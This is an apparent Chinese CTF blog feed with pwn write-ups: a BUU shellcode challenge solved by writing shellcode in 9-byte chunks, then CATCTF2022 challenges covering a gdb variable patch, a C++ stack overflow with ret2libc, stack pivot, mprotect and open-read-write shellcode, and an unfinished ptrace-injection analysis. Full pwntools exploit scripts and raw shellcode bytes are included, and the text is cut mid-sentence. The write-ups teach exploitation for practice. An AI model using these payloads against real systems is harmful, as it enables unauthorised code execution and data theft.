      <url>/posts/7bda138.html</url>
      
        <content type="html"><![CDATA[<p>这道题不知道我这个方法算不算非预期解，不过做出来之后看其他师傅们的wp感觉自己的方法弱爆了，下面简单分析一下这道题。</p><h2 id="保护策略：">保护策略：</h2><img src="https://s2.loli.net/2022/07/22/yK5XANsVgEDZTJU.png" alt="image-20220722114127886" style="zoom:50%;" /><h2 id="程序分析：">程序分析：</h2><img src="https://s2.loli.net/2022/07/22/NJDx2pEBTPcZl5X.png" alt="image-20220722114157199" style="zoom:50%;" /><p>这个函数就是出题人准备了一个shellcode，然后放到了一个随机的位置。但是这个shellcode放到的这个位置是不可执行的… 不知道有啥意义，反正我感觉这道题跟这个函数没关系。</p><img src="https://s2.loli.net/2022/07/22/yA34E6fTnPr19DF.png" alt="image-20220722114346426" style="zoom:50%;" /><p>这个函数就是可以输入一个9字节的内容，然后将其执行。只要程序不崩溃，并且不执行break。那就可以无限重复这些代码。</p><h2 id="大致思路">大致思路</h2><p>由于出题人给的那个shellcode也执行不了，所以就不考虑那里了。然后每次只能执行九字节的数据，直接写shellcode肯定是不行的。我们先到函数指针那里调试，看看是什么情况。</p><p><img src="https://s2.loli.net/2022/07/22/9bEw5lF6gLaPjyr.png" alt="image-20220722114806036"></p><p>调试发现，存在可写同时还可执行的内存只有0x7fffff7ff6000这一段内存。那么思路肯定是把shellcode写到这片内存，然后将其执行。</p><p>但是貌似没法用函数来写shellcode，然后我就考虑自己编写一段汇编，然后将shellcode的机器码一字节一字节写到这片内存。同时观察此时的寄存器rdx(如下图)，发现rdx的值就是可执行内存的地址。</p><p><img src="https://s2.loli.net/2022/07/22/lhXn4tUZoL7qsxc.png" alt="image-20220722115221760"></p><p>然后我编写了下面这段汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x48</span><br><span class="line">pop [rdx+0x20]</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这段汇编的意思就是说把0x48写到rdx+0x20指向的内存，然后执行ret指令。这个0x48也就是shellcode的机器码中的一个字节，然后不断循环，下次写入到[rdx+0x21]，依次类推。之所以我放到0x20处，是为了不破坏我们写入的九字节数据(只要不破坏九个字节的数据，偏移是多少都可以)</p><p>shellcode的机器码如下  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">在线汇编转机器码的网站</a></p><p><img src="https://s2.loli.net/2022/07/22/WfsnwubMAOcr2zC.png" alt="image-20220722115739583"></p><p>然后就用上面的方法把这个shellcode一字节一字节的写入。</p><p>举个例子，第一次执行push 0x48;pop [rdx+0x20];ret的时候，就转成对应机器码</p><img src="https://s2.loli.net/2022/07/22/EyP2wMzqDeKXB8p.png" alt="image-20220722115953307" style="zoom:33%;" /><p>然后payload这么写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>依次类推，将shellcode一个字节一个字节写入即可。</p><p>最后将shellcode写完的时候，执行下面的汇编指令(转成机器码)跳转到shellcode上即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rdx,0x20</span><br><span class="line">jmp rdx</span><br></pre></td></tr></table></figure><p>效果如下，此时jmp rdx就跳转到了我布置的shellcode上了。</p><p><img src="https://s2.loli.net/2022/07/22/MxuyOCkr4jpRtPq.png" alt="image-20220722120527335"></p><h2 id="EXP：">EXP：</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29220)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x20\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x58\x48\x89\x42\x21\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xC0\x00\x00\x00\x8F\x42\x22\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6A\x8F\x42\x23\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x3B\x8F\x42\x24\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x58\x8F\x42\x25\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x26\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x27\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xFF\x00\x00\x00\x8F\x42\x28\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x29\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xBF\x00\x00\x00\x8F\x42\x2A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x62\x8F\x42\x2C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x69\x8F\x42\x2D\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6E\x8F\x42\x2E\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2F\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x73\x8F\x42\x30\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x68\x8F\x42\x31\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x00\x8F\x42\x32\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x57\x8F\x42\x33\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x54\x8F\x42\x34\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x5F\x8F\x42\x35\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x36\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x37\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xF6\x00\x00\x00\x8F\x42\x38\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x39\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x3A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xD2\x00\x00\x00\x8F\x42\x3B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x0F\x8F\x42\x3C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x05\x8F\x42\x3D\xC3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x83\xC2\x20\xFF\xE2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/07/22/ygNzXT6w8vYr3JL.png" alt="image-20220722120733156" style="zoom: 50%;" /><h2 id="更简单的思路">更简单的思路</h2><p>做出来之后，我去看了其他师傅的wp，发现roderick师傅的思路非常简单和巧妙。<a href="https://www.cnblogs.com/LynneHuan/p/15229732.html">roderick师傅的这篇文章</a></p><p>用到了xchg这个指令（这个指令的作用就是交换两个寄存器的值）</p><p>因为在执行call rdx的时候，rdx就是可执行内存的地址，让它跟rsi寄存器互换一下。由于rax寄存器正好是0，所以执行syscall就相当于read函数往可执行区域去写数据。效果如下图</p><p><img src="https://s2.loli.net/2022/07/22/284NKCPMorVikBR.png" alt="image-20220722121138002"></p><p>这样就可以直接往可执行的这片内存写入数据了。(我又让rsi加了9，这样就直接写到了紧接着syscall指令的地方)这样syscall执行完，直接就执行我写入的数据了 效果如下图</p><img src="https://s2.loli.net/2022/07/22/AtRf8Xl1MgN9E3e.png" alt="image-20220722121403173" style="zoom:50%;" /><h2 id="EXP">EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29220</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x87\xF2\x48\x83\xC6\x09\x0F\x05&#x27;</span>)</span><br><span class="line">p.sendline(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/22/Y2tCNxBViLodyRb.png" alt="image-20220722121508169"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CATCTF2022_pwn复现</title>
      <link href="/posts/74f96fff.html"/>
      <url>/posts/74f96fff.html</url>
      
        <content type="html"><![CDATA[<h2 id="welcome-CAT-CTF">welcome_CAT_CTF</h2><p>运行程序，发现是一个小游戏，可以上下左右来移动 <code>@</code> 这个字符，并且程序运行之初询问了服务器的 IP 和端口。</p><p>看伪代码的这里(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301041745431.png" alt=""></p><p>如果能进入此处的 if ，那么就可以获取到服务器上的 <code>flag</code> ，条件有两个，第一个是满足<code>s[100 * v0 - 100 + v1] == &amp;unk_963B</code> 这个后面的其实就是字符 <code>@</code> 。</p><p>而在按下 <code>w</code> 键，进行的操作如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot; &quot;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">100</span> * v0-- + v1] = (__int64)<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s[<span class="number">100</span> * v0 + v1] = (__int64)&amp;unk_963B;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>按照逻辑可以猜测，按下 <code>w</code> 是向上移动，而向上移动的前提肯定是上面的那个内存要是空格，不然当前 <code>@</code> 上面有字符是无法向上移动的(可以结合程序运行发现这一点)，所以可以猜测 <code>s[100 * v0 - 100 + v1]</code>指向的就是当前字符 <code> @</code> 的上一个格子，因此获取 <code>flag</code> 的那个 if 前面的判断就是需要当前 <code>@</code> 上面的格子里也是一个 <code>@</code>，实现这一点只需要简单的 <code>adws</code>来移动即可。</p><p>而程序正常运行的话无论如何也无法让 <code>glod</code> 这个变量大于 <code>100000000</code> ，而获取 <code>flag</code> 的方式只要是进入这个 if 判断就可以获取，因此可以使用 <code>gdb</code> 中的 <code>set</code> 命令修改变量的值，从而绕过检查。</p><p>总结一下就是先用 <code>gdb</code> 修改 <code>glod</code> 这个全局变量大于 <code>100000000</code> ，接着让 <code>@</code> 移动到 <code>@</code>下面，然后按下 <code>j</code> (因为获取 <code>flag</code> 的那个 if 条件是在 <code>case: ‘j’</code> 下面的) 即可获取flag</p><h2 id="bitcoin">bitcoin</h2><p>这题当时就扫了一眼，一看是 <code>C++</code> 的题目直接跑路了，不过比赛完了之后入门了一下 <code>C++</code> 所以现在正找 <code>C++</code> 的题目练练手呢（ <code>winmt</code> 师傅出的那个除外，实在感觉太难辣，如果有可能的话放到最后复现，如果没可能的话就跑路了 QAQ ），这道题其实一点也不难，就是一个常规的栈溢出，不过 <code>C++</code> 写的程序，确实跟之前做的常规栈溢出还有一点不太一样。</p><p>关于 <code>C++</code> 零基础入门，从零到零点一的话，可以看这篇<a href="https://zikh26.github.io/posts/4320fd7a.html">文章</a></p><h4 id="保护策略">保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112149112.png" alt="image-20230111214911908" style="zoom: 67%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112154233.png" alt="image-20230111215447098" style="zoom:50%;" /><h4 id="漏洞所在：">漏洞所在：</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112158735.png" alt="image-20230111215853664" style="zoom:50%;" /><p>因为没有开 <code>canary</code> ，因此这里 <code>std::cin &gt;&gt; v4</code> 包括往 <code>v3</code> 中输入数据都是存在栈溢出的。</p><p>所以常规打一个 <code>ret2libc</code> 即可，然后程序禁用了 <code>execve</code> ，最后去执行 <code>orw</code></p><h4 id="利用思路：">利用思路：</h4><p>这里要说明一点，本题要再次输入的话，要利用 <code>cin &gt;&gt;</code> 来实现，这个东西是需要控制两个参数的，第一个是 <code>std::cin</code> 的地址，第二个是写入数据的目标地址。而执行的地方为</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112245220.png" alt="image-20230111224545172"></p><p>有一点像 <code>scanf</code> 函数，然后就是先泄露 <code>libc</code> 地址，同时控制 <code>rbp</code> 的值为接下来的栈迁移做一个准备，再做一个往 <code>bss</code> 段上输入的 <code>rop</code> ，最后给一个 <code>leave ; ret</code> 触发栈迁移。准备往 <code>bss</code> 段上写的 <code>rop</code> 是在已经有了 <code>libc</code> 地址的情况下做的，因此我们可以去调用 <code>mprotect</code> 函数将 <code>bss</code> 段改为可读可写可执行，后面紧跟着执行 <code>orw</code> 的 <code>shellcode</code>。</p><p>其实泄露的 <code>libc</code> 地址就一个用处，就是从 <code>libc</code> 中取了一个 <code>pop rdx ; ret</code> 这个 <code>gadget</code></p><p>需要注意的是， <code>orw</code> 之前必须要先把标准输入给 <code>close</code> 掉。也就是先执行 <code>close(1)</code> 再 <code>open</code> <code>read</code> <code>write</code>  不然远程打印不出来 <code>flag</code></p><h4 id="EXP">EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;61.147.171.105:61597&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000406303</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000406301</span></span><br><span class="line">cin_addr=<span class="number">0x6093A0</span></span><br><span class="line">use_cin=<span class="number">0x401C30</span> </span><br><span class="line">bss_addr=<span class="number">0x609530</span></span><br><span class="line">leave_addr=<span class="number">0x40223A</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x40</span>+p64(bss_addr-<span class="number">8</span>)+p64(<span class="number">0x40223B</span>)+p64(pop_rdi)+p64(e.got[<span class="string">&#x27;mprotect&#x27;</span>])+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(cin_addr)+p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(use_cin)+p64(leave_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name: &quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4021D8</span>,<span class="number">0x401C30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Password: &quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">mprotect_addr=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=mprotect_addr-libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;mprotect_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(pop_rdi)+p64(bss_addr&amp;<span class="number">0xfff000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x48</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301120046474.png" alt="image-20230112004628191"></p><h2 id="injection2-0">injection2.0</h2><p>这种类型的题目是第一次见，跟着官方的 <code>WP</code> 复现一下。</p><h3 id="文件分析">文件分析</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131110883.png" alt="image-20230113111031792"></p><p>给的文件是上面这些， <code>rootfs.img</code> 文件是一个文件系统映像文件，它是将 <code>_install</code> 文件进行了打包。所以这里是用 <code>qemu</code> 来模拟的，在 <code>_install</code> 文件中 <code>init</code> 作为 <code>qemu</code> 的初始化脚本。</p><p><code>init</code> 文件内容如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 755 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span></span><br><span class="line">poweroff -f # 设置 shell 退出后则关闭机器</span><br></pre></td></tr></table></figure><p>而关键是在下面三句</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>第一句是关闭了 <code>linux</code> 内核中的 <code>ptrace</code> 限制。<code>ptrace</code> 是一种 <code>linux</code> 内核中的进程调试功能，他可以让一个进程跟踪另一个进程的执行情况，跟踪进程可以访问被跟踪进程的内存空间和寄存器的值。为了防止恶意程序利用 <code>ptrace</code> 进行攻击，<code>Linux</code> 内核开发者在内核引入了 <code>yama</code> 的安全机制，其中的一个子模块 <code>ptrace_scope</code> 就是用来限制 <code>ptrace</code> 使用的，默认情况下， <code>yama</code> 的 <code>ptrace_scope</code> 被设置为 <code>1</code> ，这意味着只有当父进程和子进程属于同一用户时，才能跟踪子进程，<strong>如果设置为 <code>0</code> 就是关闭这个限制，任何进程都可以跟踪其他进程</strong>。</p><p>第二句是运行 <code>target</code> 程序，并将程序的标准输出和标准错误都重定向到 <code>pso.file</code> 文件，并将该进程设置为后台进程。</p><p>第三句是脱离原先的终端，并获取 <code>root</code> 权限</p><p>然后 <code>target</code> 文件内容如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131739623.png" alt="image-20230113173903535"></p><p>先将 <code>flag</code> 文件读入到栈上，然后 <code>close</code> 将三个文件流全部关闭，再将 <code>flag</code> 